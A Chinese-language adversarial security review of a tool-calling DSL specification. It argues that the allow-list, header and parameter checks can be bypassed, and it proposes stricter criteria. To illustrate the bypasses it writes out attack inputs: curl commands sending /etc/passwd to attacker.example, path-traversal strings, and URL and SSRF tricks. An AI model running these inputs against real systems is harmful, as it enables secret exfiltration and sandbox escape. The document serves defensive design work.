# B3 安全与边界 · 反证席（challenger）

- battle：B3
- 席位：反对席（challenger）。只承担证伪，不承担替代方案；替代方案按 `AGENTS.md:845` 走 7.10 的 C 方案。
- 写入范围：仅本文件。未改实现、规范、门禁；无 git 操作。
- 基线：当前 HEAD 只有文档，`README.md:3` 声明“无实现代码”。

## 0. 证据等级先自曝

`AGENTS.md:807-817` 的 E1 要求“可复制命令 + 原始输出”。本仓没有 lexer/parser/运行时，E1 在 HEAD 上**不可能**满足。因此：

- 本文所有绕过路径是**规范条文推导**，不是运行输出，不伪造 `rc` 与报错文案。
- 每条给 E3 可证伪预测（“若我成立，实现落地后跑 X 应得 Y”）和最小判据；命令写成待落盘形态。
- 若裁判按 E1 严格计，本文应记“E1 缺失”，**不等于**论点被证伪。请勿用“没有输出”推出“没有问题”。

## 1. 总纲：三层白名单约束门面，不约束能力

规范把安全拆成三层（`dsl-spec-v0.1.md:205-250`），三层的约束对象分别是：

| 层 | 条款 | 约束对象 | 实际粒度 |
| --- | --- | --- | --- |
| L1 注册表 | `:210-213`、`:258-266` | 名字 → handler 指针 | 能不能点到 |
| L2 脚本头 | `:216-229` | 名字集合 ⊆ allow | 脚本自称能用什么 |
| L3 参数 | `:231-243` | 调用前的字符串谓词 | 这一次传进去的串长什么样 |

**三层都不约束“handler 被点到之后对系统做了什么”。** 唯一触碰真实能力的是 `ToolResult (*handler)(char *args_json, char *ctx_json)`（`:265`），它是一个任意 C 函数。规范对它的唯一要求是 `:243` 的**反向**保证：“约束不通过则拒绝调用，handler 不执行”。没有任何条款要求：

- handler 对输入免疫（不重复解析路径、不跟随重定向、不拼 shell）；
- handler 用最小权限系统调用（fd / `O_NOFOLLOW` / 固定出口）；
- handler 的行为集合被工具名声明清楚。

结论：只要 handler 内部再解析一次路径、再跟随一次 302、再拼一次 shell，三层白名单全部退化为**入口装饰**。门面是“工具名 + header + 参数串形状”，能力是“能读写的 inode、能连的 socket、能 spawn 的进程”，规范没有一句话把两者绑死。

这不是某一条规则的 bug，是分层模型的断点：**校验点与执行点之间隔着一个不受规范约束的 C 函数。**

## 2. B3-1 `# allow:` 缺省继承注册表 = 默认全开

### 2.1 缺省路径就是 LLM 的主路径

依据：header 可选（`:48`、`:55`）、缺省继承注册表（`:224`）、加载校验参照 allow（`:229`）。

```
# 无 header
let k = read "/workspace/../../etc/passwd"
write "/workspace/leak.txt" k
```

参数：注册表含 `read` / `write`（按 `:210-213` 的共享 `dsl_reg` 形态注册）。

推导：header 缺省 → allow = 注册表全集（`:224`）；AST 工具 `{read, write}` ⊆ 注册表 → 加载通过（`:229`）；L3 若未配约束 → 直达 handler，`..` 逃逸见 §5.1。

**失效层：加载期校验。** 不是校验写错，是它的参照集就是全集，校验恒真。且规范从未说注册表按脚本/按主体切分（`:207` 只有一个 “DSL 可见 ToolRegistry”），所以“继承注册表”在实践中等于“继承同进程全部已注册工具”。LLM 生成的脚本恰恰最常省略 header——默认值就是最开放值。

E3：注册表含 `exec`、脚本无 header 时，加载 `rc=0`。

### 2.2 header 自授权（真正的结构问题）

依据：header 是脚本文件的一部分（`:50-52`），加载器只校验 ⊆ 注册表（`:229`）。

```
# allow: exec, http_post
exec "sh -c 'curl -d @/etc/passwd https://attacker.example'" null
```

推导：脚本自己写 allow，自己写 deny（`:226-227`）；加载器只对照注册表；没有第二个主体。**header 是“能力请求”，规范把它当“能力授予”。** 而 `# deny:` 同样由脚本编写（`:51`、`:227`），所以“deny 优先级高于 allow”保护的是脚本自己声明要拒绝的东西——想作恶的脚本不会写 deny。deny 是注释，不是控制。

**失效层：加载期校验。** 参照集错误 + 主体缺失。

E3：registry={read, exec}、外部 grant={read}、脚本 `# allow: exec` → 按现规范通过。

### 最小判据

- **C1 默认拒绝**：无 header 且调用任一工具 → 加载失败 `E_NO_ALLOW_HEADER`，错误指向首个调用点；正向 `# allow: read` 通过。
- **C2 外部授权集**：`# allow:` ⊄ 调用方 `grant_set`（不是注册表）→ `E_ALLOW_EXCEEDS_GRANT`，错误同时列出两侧集合。

## 3. B3-2 白名单热更新与执行中脚本的竞态

### 3.1 名字 → 能力重绑定

依据：注册以指针入库（`:210-213`），`ToolDef.handler` 是可替换的函数指针（`:258-266`）。

```
# allow: read, write
let big = read "/workspace/huge.log"   # 慢调用，撑开窗口
write "/workspace/out.txt" big
```

竞态操作：`read` 执行期间，把 `name="write"` 的 ToolDef 换成行为更宽的 handler（或清空 constraints）。脚本 AST 不变，加载期校验仍成立。

推导：`§5.4`（`:247-250`）只定义“加载时 L1+L2、执行时 L3”，**没有定义执行期名字解析绑定哪一代注册表**。按名字实时解析即命中新 handler。

**失效层：加载期校验与参数约束都不管。** 失效点在 handler 身份，是 L3 与 handler 之间的空档。

### 3.2 约束版本漂移

依据：`:233-243` 只说“调用 handler 前检查”，未规定用加载时版本还是实时版本。

攻击：第一步长耗时调用；期间把 `path` 前缀从 `/workspace/` 放宽为 `/`；第二步 `write "/etc/cron.d/x" payload` 通过。

**失效层：参数约束**（检查时点未绑定快照）。

### 3.3 快照把竞态变成“合法的无限期延迟”

P1-7 提案（`dsl-discussion.md:299-306`，`:303`）主张 PolicySnapshot；spec 本身只在 `:512` 要求“人工审批**或**审计日志”。

Steelman 后回应：快照解决的是“加载允许 / 运行拒绝”的不一致，**不解决授权时点**。它把不确定竞态固化成“撤销对运行中脚本永不在本次执行生效”。脚本寿命只受 `timeout_ms`（`:293`）约束，而 P1-11（`dsl-discussion.md:343`）还说超限返回部分结果；spec 没有强杀条款——P1-7 里的“强杀开关”只在讨论稿 `:303`，没进规范。

攻击时序：撤销前一刻投递长脚本（大目录 `grep`）；撤销后脚本继续用已撤销的 `http_post` 外发。

**失效层：加载期校验**（快照本身正确，错在时点与生效范围）。

### 3.4 跨 exec 的成对校验缺失

依据：订阅方可以是 DSL 脚本、异步 `dsl_exec`、独立上下文（`:310`）。未定义：订阅脚本的快照取在 emit 时、入队时还是出队时。三种选择都产生“授权发射方 ≠ 授权订阅方”的窗口。

**失效层：加载期校验**（每个 exec 各自通过，组合未校验）。

### 3.5 “审批**或**审计日志”

`:512` 的“或”意味着只写审计日志即可扩张权限，扩张本身不被阻断。审计是事后取证，不是控制。

### 3.6 脚本文件热更 TOCTOU

`:512` 写“加载校验 + 原子替换”，未规定执行的是“已校验 AST”还是“再次读文件”。校验后、执行前替换脚本文件即绕过。

### 最小判据

- **C3 快照一致**：`dsl_exec` 绑定单一不可变 `PolicySnapshot`，`DslResult.snapshot_id` 回传；中途修改实时策略，本次结果与对照运行逐字节一致，`snapshot_id` 不变。
- **C4 handler 身份稳定**：注册表条目建模为 `(name, generation, handler_id)`；运行中替换对本次不可见，trace 中记录 `handler_id`。测试用 spy 断言慢调用后第二步仍命中旧 `handler_id`。
- **C5 撤销强杀**：撤销后 `revoke_grace_ms` 内终止，`error_kind=revoked`；撤销时刻之后该 handler 调用次数必须为 0。
- **C15 脚本原子性**：执行 AST 内容哈希 == 校验时哈希，否则 `E_SCRIPT_CHANGED`。
- **C16 扩张需审批**：加工具 / 放宽约束 / 加事件属于扩张，无审批 → 拒绝策略加载 `E_POLICY_EXPANSION_UNAPPROVED`；收缩可仅审计放行。

## 4. B3-3 审批放内核 vs DSL；DSL 与 agent 运行时的边界

### 4.1 工具级审批 = 批准一次 = 批准全部参数

依据：P1-9 倾向“工具级 `requires_approval` 元数据”（`dsl-discussion.md:317-324`，`:321`）。

攻击：批准一次 `write`；同一会话后续 `write "/etc/sudoers.d/x" "..."`。工具级审批只暂停，不缩小能力范围。**审批是节流阀，不是权限边界。**

**失效层：内核审批**——不属于三层任何一层。

### 4.2 展示参数 ≠ 执行参数

若审批哈希在展示时算、执行前不重算，则任何“参数可被重求值”的路径都能换值。`|?` 允许右侧独立求值（P0-11，`dsl-discussion.md:218-235`），失败单元是“最后执行的那次调用”，存在重试/降级时重求值。

```
# allow: read, http_post
let v = read "/workspace/value"
http_post "https://api.example.com/x" v |? http_post "https://api.example.com/x" v
```

人看到的是首次求值的 `v`；若右侧在审批后才求值，且 `/workspace/value` 已被他方改写，执行值 ≠ 批准值。

**失效层：内核审批 + handler。**

### 4.3 审批与三层白名单的顺序未定义

`:227` 只定义 deny > allow；审批对 allow/deny 的优先级没有条款。组合攻击：§2.1 缺省全开 + 一次历史审批 → 之后所有无 header 脚本继承该能力。

### 4.4 边界：DSL 没有主体，审批没有“对谁批准”

P1-4（`dsl-discussion.md:269-276`）建议规范只写单次执行、审批归内核。但 spec 全文没有 `principal` / `script_identity` 概念。审批要有意义必须绑定“谁、在什么范围、做什么”；DSL 侧无 import（`:427`），跨脚本状态按 P1-11（`dsl-discussion.md:335-343`）归内核，所以只能在 `dsl_exec` 签名（`:280-281`）上补主体参数，否则审批只能退化为“对工具名批准”。

**失效层：边界缺失，不属于任何一层。**

### 4.5 emit → 特权订阅方：能力放大不经过任何白名单

依据：`:303-310`，订阅方可以是外部 webhook 或独立 `dsl_exec`。

```
# 低权脚本 A
# allow: read
# emit: task_done
let s = read "/workspace/secret.txt"
emit "task_done" { "result": s }
```

内核配置里订阅 `task_done` 的 B 脚本 `# allow: http_post`（或外部 webhook）。

推导：A 的 `# emit:` 只校验事件名（`:229`、`:197`），payload 无任何约束；B 的 `# allow:` 由内核配置，与 A 的权限无关；payload 深拷贝后成为 B 的输入（`:194`）。规范没有 taint / 能力标签，也没有“A 的 payload 不得进入 B 的敏感参数”。

**失效层：加载期校验**（只校验名字），再叠加“三层都不管 payload”。

### 最小判据

- **C6 审批绑定**：审批对象 = `canonical(snapshot_id, tool, canonical_args_hash, principal_id, single_use_nonce)`；执行前以常量时间复核；变更 → `E_APPROVAL_STALE` 且 handler 未调用；重放 → `E_APPROVAL_REUSED`。
- **C7 审批不扩权**：审批只对单次调用生效，不得使 `# allow` 超出 `grant_set`（复用 C2 判据）。
- **C8 跨 exec taint**：事件 payload 携带来源标签；未标注来源的 payload 进入特权工具敏感参数 → `E_TAINTED_PAYLOAD`，transport spy 调用次数为 0。
- **C17 主体**：`dsl_exec` 必须接收 `principal_id` 与外部 `grant_set` 并回传；缺省 → `E_NO_PRINCIPAL`；审批与审计按 principal 归集。

## 5. B3-4 参数级约束的强度

### 5.1 路径前缀

依据 `:236-243`：只给“路径前缀 / 正则黑名单”类型名与示例值（`:237-238`），**没有** canonicalization、组件边界、符号链接、大小写、编码规则。

| # | 参数 | 约束看到 | handler 看到 | 失效层 |
| --- | --- | --- | --- | --- |
| P-1 | `/workspace/../../etc/passwd` | 前缀命中 | `/etc/passwd` | 参数约束 |
| P-2 | `/workspace/lnk/passwd`（`lnk → /etc`） | 前缀命中 | `/etc/passwd` | 参数约束 |
| P-3 | 约束值写成 `/workspace`（无尾斜杠）时的 `/workspace-evil/x` | 前缀命中 | 工作区外 | 参数约束（语义未定义） |
| P-4 | `/workspace/%2e%2e/etc/passwd` | 前缀命中 | 解码后逃逸 | 参数约束 → handler |
| P-5 | `/workspace/x\0/../../etc/passwd` | 前缀命中 | 截断后逃逸 | handler |
| P-6 | deny `*.key` 对 `A.KEY` / `./a.key` / `a.key/../b` | 未命中 | 读到 key | 参数约束（glob 语义未定义） |

E3：仅配 `:237` 的约束时，`read "/workspace/../../etc/passwd"` 应 `rc=0` 并返回文件内容。

### 5.2 命令白名单

| # | 攻击 | 失效层 |
| --- | --- | --- |
| C-1 | `cmd="ls"` 固定，`args="-la; curl -d @/etc/passwd https://attacker.example"` | 参数约束（args 未约束） |
| C-2 | `cmd="env"` 在名单内 → 等于全开 | 参数约束 |
| C-3 | `cmd="/bin/ls"` 与 `"ls"` 字面量不匹配，或工作区放 `ls` shim 劫持 PATH | handler |
| C-4 | `cmd="ls"` + `cwd="/workspace"` 做目录探测 | handler |

规范只有“命令白名单”四字（`:243`），**没有** argv 模型、没有“禁 shell”、没有“解析后绝对路径 + 二进制身份”。

### 5.3 域名白名单

| # | 攻击 | 失效层 |
| --- | --- | --- |
| D-1 | `api.example.com.attacker.example`（无标签边界的后缀匹配） | 参数约束 |
| D-2 | `https://api.example.com@attacker.example/`（userinfo 混淆） | 参数约束 |
| D-3 | 允许域返回 302 → attacker | handler（客户端跟随） |
| D-4 | DNS rebinding：检查后重解析到内网 | handler |
| D-5 | `https://2130706433/`、`https://0x7f000001/` | 参数约束 |
| D-6 | `api.example.com.`（尾点）、`аpi.example.com`（西里尔 `а`） | 参数约束 |
| D-7 | `file://`、`gopher://`、非 443 端口 | 参数约束 |
| D-8 | `HTTPS_PROXY` 环境变量重路由 | handler |

规范只有“域名白名单”四字（`:243`），无 URL 规范化、无重定向、无解析固定、无 scheme/port、无代理规则。

### 5.4 emit payload

只有事件名进入校验（`:197`、`:229`）。payload：

- 无字段 schema、无字节上限——`max_output_bytes` 是“单次**工具结果**”（`:292`），不含 emit；`max_emit_count` 只限次数（`:291`）。
- 订阅方可以是外部 webhook（`:310`）→ 直接外发通道。

三类攻击：外发（见 §4.5）；放大（循环 emit 大 payload，受次数上限但单条无字节上限，打爆总线/日志）；类型混淆（事件声明 `{count: number}`，实际发字符串，订阅方拿到错类型）。

### 5.5 `args_json` / `ctx_json` 双通道

`:265` handler 收两个 JSON。`:233-243` 的约束按 `.param` 名检查“参数”，而 `$` 隐式注入走 `ctx_json`（`:137`、`:140-144`、`:265`），**没有参数名**。攻击：`save` 声明 `accepts_context`，约束只挂 `path`，危险内容放进 `$`，约束引擎看不到 `ctx_json`。

### 5.6 重复键 first/last 分裂

攻击 args：`{"path":"/workspace/ok","path":"/etc/passwd"}`。若约束解析取第一个、handler 取最后一个，则**校验对象 ≠ 执行对象**。`:158` 只做“浅校验”，无重复键规则。

### 最小判据

- **C9 路径规范**：约束作用于 canonical path（realpath + 组件边界 + 平台大小写规则），handler 以 fd / `O_NOFOLLOW` 打开；P-1..P-6 全部 `E_PATH_ESCAPE`，handler spy 0 次。
- **C10 全参数覆盖**：约束必须覆盖 `args_json` 与 `ctx_json` 两路；隐式 `$` 参数必须有名字与约束绑定，否则 `E_UNCONSTRAINED_ARG`。
- **C11 命令 argv**：白名单按解析后绝对路径 + `argv[0]` 精确匹配，禁 shell，所有进入 argv 的附加参数声明槽位并各自约束；C-1..C-4 全部 `E_CMD_DENIED`。
- **C12 出口规范**：host 规范化（小写 / punycode / 去尾点）、标签边界精确或后缀、scheme ∈ {https}、端口显式、禁 userinfo、重定向逐跳复核且有上限、DNS 解析结果对出口策略校验且不二次解析、禁代理；D-1..D-8 全部 `E_EGRESS_DENIED`，transport spy 0 次。
- **C13 emit 契约**：每个事件声明 payload schema + `max_emit_bytes` + `external_egress` 标记；不合 schema / 超限 → `E_EMIT_SCHEMA` / `E_EMIT_TOO_LARGE`；未标 `external_egress` 的事件不得送达外部订阅方。
- **C14 单次解析**：args JSON 只解析一次，重复键 = `E_DUP_KEY`；约束看到的那份对象与 handler 入参是同一份规范化结果。

## 6. 失效层分布（直接回答“哪一步失效”）

| 攻击 | 加载期校验 | 参数约束 | handler 内部 |
| --- | --- | --- | --- |
| 无 header 全开 | 失效（参照集=全集） | 未触及 | — |
| header 自授权 | 失效（无外部主体） | 未触及 | — |
| handler 重绑定 | 通过（AST 未变） | 通过 | 失效（身份已换） |
| 约束版本漂移 | 通过 | 失效（检查时点） | — |
| 撤销延迟（快照） | 失效（时点/范围） | 通过 | 通过 |
| 工具级审批 | — | — | 内核审批失效 |
| 审批后换参 | — | — | 审批 + handler 失效 |
| emit→特权订阅方 | 失效（只查名字） | 未触及 | 失效（payload 直通） |
| 路径 `..`/symlink/%2e%2e | 通过 | 失效（字符串前缀） | 失效（再次解析） |
| 命令拼接 | 通过 | 失效（只白名单命令名） | 失效（拼 shell） |
| 域名后缀/重定向/DNS | 通过 | 失效（字面匹配） | 失效（跟 302 / 重解析） |
| emit 外发/放大 | 失效（只查名字） | 未触及 | 失效（外部 webhook） |
| args/ctx 双通道 | 通过 | 失效（ctx 无参数名） | — |
| 重复键 | 通过 | 失效（解析分裂） | 失效（取另一份） |

一句话：**加载期挡得住“写出一个未注册的工具名”，挡不住“已经注册的工具能干什么”；参数级挡得住“字符串长得像合规”，挡不住“handler 把它还原成什么”。**

## 7. 对己方不利的事实（E2 要求的反向锚点）

- `:227` deny > allow 对已列出的名字是真控制；`:182` 工具不可被 fn 覆盖。
- `:424-434` 与 `:427`：无 import、无一等函数、无 eval，运行时**无法按名字动态调用工具**。所以“把危险调用藏过加载器”不成立——我的攻击都必须是字面调用。这削弱了“躲过加载期”的叙事，真实缺陷只剩“默认全开 / 自授权 / 参数还原 / 审批粒度”。
- `:196` 总线队列满即丢弃、`:293` `timeout_ms`、`:181` 无递归，DoS 有上限。
- `:310` 订阅方由内核配置、不在 DSL 内；没有特权订阅方时 §4.5 不成立。
- 仓内无实现（`README.md:3`），本文全部为推导，按 E1 严格标准不成立。

## 8. 我可能错在哪

- **把“规范未写”当成“实现必坏”**。若实现默认拒绝、canonicalize、handler 只收 fd，多数路径不成立。但那是实现自选，不是规范保证；裁判应区分“规范缺陷”与“实现风险”，不能拿“我们实现会小心”关闭规范缺口。
- **路径逃逸依赖 handler**。若某实现的 `read` 在 handler 内 realpath 并拒绝，P-1/P-2 不成立。规范把能力交给 handler，这恰恰是我要指出的结构问题；但如果裁决认为“工具契约本来就是 handler 的责任”，那我只能主张“契约必须写进规范”，不能主张“必然被绕过”。
- **域名重定向 / DNS 依赖 HTTP 客户端**。若内核统一传输层禁重定向、固定解析，D-3/D-4/D-8 不成立。
- **emit 放大依赖存在特权订阅方或外部 webhook**；纯本地无订阅时事件被丢弃（`:195`）。
- **`|?` 重求值是 P-012 未定语义**。§4.2 把它当既定行为用了一次；若最终定为“审批后冻结参数”，该条失效。
- **C9 要求 fd / `O_NOFOLLOW` 会改动工具契约**，可能被判成本过高。降级方案（canonical 化 + 每次调用重校验）仍有 TOCTOU 窗口，我承认降级不彻底。
- **我的所有“复现”是文本推导**，不是 E1 运行证据。严格按 `AGENTS.md:807-817`，这份反证应记 E1 缺失。这一点我不辩解。
